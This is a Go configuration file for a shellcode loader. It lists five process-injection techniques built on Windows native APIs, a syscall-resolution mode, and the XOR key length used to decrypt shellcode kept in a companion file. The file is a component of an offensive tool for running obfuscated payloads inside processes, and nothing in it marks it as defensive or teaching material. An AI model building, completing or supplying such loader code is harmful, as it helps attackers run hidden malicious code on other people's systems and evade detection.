package config

/*
 * Loader build configuration.
 * Edit these values to change loader behavior at compile time.
 */

// DefaultTechnique selects the injection technique by index.
//  0 = NtThread      NtCreateThreadEx
//  1 = NtApc         NtQueueApcThread + NtTestAlert (self-inject)
//  2 = NtSection     NtCreateSection + NtMapViewOfSection (dual-map)
//  3 = NtCallback    EnumWindows callback
//  4 = NtSuspended   NtCreateThreadEx (CREATE_SUSPENDED) + ResumeThread
const DefaultTechnique = 0

// SyscallMode controls how NT functions are resolved.
//  "lazy"  = syscall.LazyDLL (default, resolved on first call)
//  Indirect syscalls not yet implemented for Go loader.
const SyscallMode = "lazy"

// XorKeyLen is the XOR key length in bytes for shellcode decryption.
// Must match the key embedded in shellcode.go.
const XorKeyLen = 16
